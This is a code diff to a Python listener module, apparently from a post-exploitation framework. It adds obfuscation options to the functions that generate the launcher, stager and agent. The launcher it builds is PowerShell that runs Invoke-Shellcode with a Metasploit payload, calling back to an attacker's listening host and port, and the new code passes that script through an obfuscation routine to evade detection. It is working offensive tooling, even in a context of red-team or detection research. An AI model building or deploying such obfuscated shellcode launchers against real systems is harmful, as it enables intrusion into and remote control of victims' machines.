@@ -65,7 +65,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -101,13 +101,15 @@ class Listener:
 
             script = helpers.strip_powershell_comments(script)
             script += "\nInvoke-Shellcode -Payload %s -Lhost %s -Lport %s -Force" % (msfPayload, host, port)
+            if obfuscate:
+                script = helpers.obfuscate(script, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return script
 
         else:
             print helpers.color("[!] listeners/meterpreter generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, encode=False, encrypt=True, language=None):
+    def generate_stager(self, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         Nothing to actually generate here for foreign listeners.
         """
@@ -115,7 +117,7 @@ class Listener:
         pass
 
 
-    def generate_agent(self, language=None):
+    def generate_agent(self, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Nothing to actually generate here for foreign listeners.
         """
